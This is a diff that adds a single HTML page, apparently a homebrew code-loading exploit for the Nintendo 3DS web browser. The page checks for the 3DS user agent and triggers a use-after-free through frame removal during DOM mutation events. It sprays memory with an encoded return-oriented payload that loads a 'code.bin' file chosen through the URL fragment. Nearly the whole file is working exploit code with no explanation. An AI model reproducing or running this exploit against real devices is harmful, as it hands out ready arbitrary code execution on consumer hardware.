@@ -1,0 +1,78 @@
+<html>
+<head>
+<style> body {color:white;background:black;} iframe {display:none;} h1 {text-align:center;} </style>
+<script>
+var payload = 
+    '\uc2fc\u0010\u50b3\u0010\uca34\u0019\ubeef\udead\ubeef\udead\ubeef\udead\u46eb\u0019\u0000\u08f1'
++   '\u8654\u08b8\u0001\u0000\ubeef\udead\ubeef\udead\ubeef\udead\ufe0c\u0022\ubeef\udead\ubeef\udead'
++   '\ubeef\udead\ubeef\udead\u57c4\u0010\u46eb\u0019\u0000\u08f1\u0020\u08f1\u0000\u1841\u4000\u0000'
++   '\ubeef\udead\ubeef\udead\u86e0\u0016\ubeef\udead\ubeef\udead\ubeef\udead\ubeef\udead\ubeef\udead'
++   '\ubeef\udead\ub5b4\u0010\ua72c\u003d\u8001\uffff\u0000\u1841\u4000\u0000\uc0de\udead\u035c\u0013'
++   '\u57c4\u0010\uc1e0\u0012\uc2fc\u0010\u7c98\u003d\u8af4\u0022\u8634\u08b8\u035c\u0013\u57c4\u0010'
++   '\ubf04\u0012\uc2fc\u0010\uca00\u3b9a\u8af4\u0022\u0000\u0000\u035c\u0013\u57c4\u0010\u41f8\u0010'
++   '\u2000\u009d\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u848c\u08b8\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u8400\u08b8\u57c4\u0010\u57c4\u0010\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\uc2fc\u0010\u8618\u08b8'
++   '\u0000\u0000\u0000\u0000\u57c4\u0010\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u85f8\u08b8\u57c4\u0010'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0344\u0013'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0004\u0000\u0000\u1841\u2000\u1959'
++   '\u4000\u0000\uffff\uffff\uffff\uffff\u0008\u0000\u0000\u0000\u0064\u006d\u0063\u003a\u002f\u0063'
++   '\u006f\u0064\u0065\u002e\u0062\u0069\u006e\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000';
+
+    if(parent==window) {
+        window.onload = function() {
+            var hash = window.location.hash.substring(1);
+            if(hash.length > 20)
+                document.body.innerHTML += "<h1>LENGTH INVALID</h1>";
+            else if(hash.length > 0) {
+                payload = payload.replace('code.bin', hash).substring(0, 384);
+                document.body.firstChild.innerHTML = "<h1>Loadcode ["+ hash +"]</h1>";
+            }
+
+            document.body.innerHTML += "<h1>RUNNING EXPLOIT</h1><iframe src='#' />";
+        };
+    } else if(navigator.userAgent.indexOf('Nintendo 3DS') != -1) {
+        var nb = 0;
+        window.onload = function () {
+            f = window.frameElement;
+            p = f.parentNode;
+            var o = document.createElement("object");
+            o.addEventListener('beforeload', function () {
+                if (++nb == 1)
+                    p.addEventListener('DOMSubtreeModified', parent.dsm, false);
+                else if (nb == 2)
+                    p.removeChild(f);
+            }, false);
+            document.body.appendChild(o);
+        };
+    }
+
+    function magicfun(mem, size, v) {
+        var a = new Array(size);
+        nv = v + unescape("%ucccc");
+        for (var j = 0; j < a.length / (v.length / 4); j++) a[j] = nv;
+        var t = document.createTextNode(String.fromCharCode.apply(null, new Array(a)));
+
+        mem.push(t);
+    }
+
+    function dsm(e) {
+        var mem = [];
+        for (var j = 0; j < 410; j++) {
+            magicfun(mem, j, unescape(payload));
+        }
+    }
+
+</script>
+</head>
+<body><h1>Loadcode [code.bin]</h1></body>
+</html>
